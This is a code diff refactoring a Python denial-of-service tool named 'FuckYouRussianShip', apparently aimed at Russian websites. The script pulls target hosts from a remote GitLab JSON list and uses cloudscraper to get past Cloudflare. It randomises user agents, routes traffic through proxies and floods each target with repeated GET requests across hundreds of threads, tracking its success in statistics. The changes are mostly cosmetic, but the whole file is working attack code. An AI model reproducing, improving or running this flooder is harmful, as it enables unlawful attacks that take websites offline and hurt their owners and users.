@@ -2,7 +2,7 @@
 import json
 import os
 import platform
-import requests
+# import requests
 from argparse import ArgumentParser
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
@@ -20,12 +20,13 @@ from pyuseragents import random as random_useragent
 from requests.exceptions import ConnectionError
 from urllib3 import disable_warnings
 import subprocess
-from shutil import which
+# from shutil import which
 
-#Garbage collector
+# Garbage collector
 import requests
 import gc
-#from pympler.tracker import SummaryTracker
+
+# from pympler.tracker import SummaryTracker
 
 statistic = {}
 work_statistic = True
@@ -55,10 +56,12 @@ class FuckYouRussianShip:
         self.threads = int(self.args.threads)
 
         try:
-            self.HOSTS = json.loads(requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
-        except:
+            self.HOSTS = json.loads(
+                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
+        except Exception:
             sleep(5)
-            self.HOSTS = json.loads(requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
+            self.HOSTS = json.loads(
+                requests.get("https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json").content)
 
         global work_statistic
         global statistic
@@ -70,12 +73,13 @@ class FuckYouRussianShip:
 
     @staticmethod
     def clear():
-        if platform.system() == "Linux":
+        if platform.system() == "Linux" or platform.system() == "Darwin":
             return system('clear')
         else:
             return system('cls')
 
-    def create_parser(self):
+    @staticmethod
+    def create_parser():
         parser_obj = ArgumentParser()
         parser_obj.add_argument('threads', nargs='?', default=500)
         parser_obj.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
@@ -92,19 +96,22 @@ class FuckYouRussianShip:
         parser_obj.set_defaults(logger_results=stderr)
         return parser_obj
 
-    def checkReq(self):
+    @staticmethod
+    def check_req():
         os.system("python3 -m pip install -r requirements.txt")
         os.system("python -m pip install -r requirements.txt")
         os.system("pip install -r requirements.txt")
         os.system("pip3 install -r requirements.txt")
 
-    def checkUpdate(self):
+    def check_update(self):
         logger.info("Checking Updates...")
-        updateScraper = cloudscraper.create_scraper(
-            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
-        url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
+        update_scraper = self.create_cloudscrape_scraper()
+        url = (
+            "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
+        )
+
         try:
-            content = updateScraper.get(url).content
+            content = update_scraper.get(url).content
             if content:
                 data = json.loads(content)
                 new_version = data["version"]
@@ -116,27 +123,31 @@ class FuckYouRussianShip:
                     exit()
             else:
                 sleep(5)
-                # self.checkUpdate()
+                # self.check_update()
             del content
-        except:
+        except Exception:
             sleep(5)
-            # self.checkUpdate()
+            # self.check_update()
+
+    @staticmethod
+    def create_cloudscrape_scraper():
+        return cloudscraper.create_scraper(
+            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}
+        )
 
     def mainth(self):
         global threads_count
         threads_count += 1
-        scraper = cloudscraper.create_scraper(
-            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
+        scraper = self.create_cloudscrape_scraper()
         scraper.headers.update(
             {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
              'Connection': 'keep-alive',
              'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
              'Accept-Encoding': 'gzip, deflate, br'})
 
-        log_file_main = 'main'
+        # log_file_main = 'main'
         while True:
-            scraper = cloudscraper.create_scraper(
-                browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
+            scraper = self.create_cloudscrape_scraper()
             scraper.headers.update(
                 {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
                  'Connection': 'keep-alive',
@@ -145,17 +156,17 @@ class FuckYouRussianShip:
             host = choice(self.HOSTS)
             try:
                 content = scraper.get(host).content
-            except BaseException as exc:
+            except Exception:
                 sleep(5)
                 continue
 
             if content:
                 try:
                     data = json.loads(content)
-                except json.decoder.JSONDecodeError as exc:
+                except json.decoder.JSONDecodeError:
                     sleep(5)
                     continue
-                except Exception as exc:
+                except Exception:
                     sleep(5)
                     continue
             else:
@@ -165,17 +176,17 @@ class FuckYouRussianShip:
 
             try:
                 site = unquote(choice(self.targets) if self.targets else data['site']['page'])
-            except BaseException as exc:
+            except Exception:
                 sleep(5)
                 continue
-            if site.startswith('http') == False:
+            if not site.startswith('http'):
                 site = "https://" + site
 
             if site not in statistic and work_statistic:
                 statistic[site] = [site, 0, 0, 0, 0, 0, 0]
 
-            log_file_name = site.replace('https://', '') \
-                .replace('http://', '').split('.')[0]
+            # log_file_name = site.replace('https://', '') \
+            #     .replace('http://', '').split('.')[0]
 
             try:
                 attack = scraper.get(site, timeout=10)
@@ -192,25 +203,23 @@ class FuckYouRussianShip:
                             {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                         response = scraper.get(site)
 
-                        if response.status_code >= 200 and response.status_code <= 302:
+                        if 200 <= response.status_code <= 302:
                             self.write_statistic_success(site, response.status_code)
-                            for i in range(self.MAX_REQUESTS):
+                            for _ in range(self.MAX_REQUESTS):
                                 response = scraper.get(site, timeout=10)
                                 self.write_statistic_success(site, response.status_code)
                                 del response
                         del response
                 else:
-                    for i in range(self.MAX_REQUESTS):
+                    for _ in range(self.MAX_REQUESTS):
                         response = scraper.get(site, timeout=10)
                         self.write_statistic_success(site, response.status_code)
                         del response
-            except ConnectionError as exc:
+            except ConnectionError:
                 self.write_statistic_error(site)
-                del exc
                 continue
-            except Exception as exc:
+            except Exception:
                 self.write_statistic_error(site)
-                del exc
                 continue
             finally:
                 threads_count -= 1
@@ -218,8 +227,8 @@ class FuckYouRussianShip:
                 del host
                 del data
                 del site
-                del log_file_main
-                del log_file_name
+                # del log_file_main
+                # del log_file_name
                 return self.mainth()
 
     @staticmethod
@@ -235,7 +244,7 @@ class FuckYouRussianShip:
     def cleaner(self):
         while True:
             sleep(60)
-            # self.checkUpdate()
+            # self.check_update()
 
             if not self.no_clear:
                 self.clear()
@@ -266,11 +275,14 @@ class FuckYouRussianShip:
                 ])
                 tp.table(data=statistic_data,
                          headers=headers,
-                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])            
+                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])
             sleep(5)
             FuckYouRussianShip.clear()
 
-    def parts_recursive(self, n, parts=[]):
+    def parts_recursive(self, n, parts=None):
+        if parts is None:
+            parts = []
+
         return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])
 
 
@@ -280,11 +292,9 @@ def attacker_threading(threads_count, worker_func):
         for task in as_completed(future_tasks):
             while True:
                 try:
-                    status, site = task.result()
-                    del status
-                    del site
+                    task.result()
                     break
-                except BaseException:
+                except Exception:
                     sleep(5)
 
 
@@ -306,7 +316,7 @@ if __name__ == '__main__':
         attacker = FuckYouRussianShip()
         if not attacker.no_clear:
             attacker.clear()
-        attacker.checkReq()
+        attacker.check_req()
 
         thread_count = attacker.threads
         attack_func = attacker.mainth
@@ -331,4 +341,3 @@ if __name__ == '__main__':
                 terminal_additional += f"-t {' '.join(attacker.targets)} "
 
             start_multi_terminals(parts, terminal_additional, first_part, attacker.mainth)
-
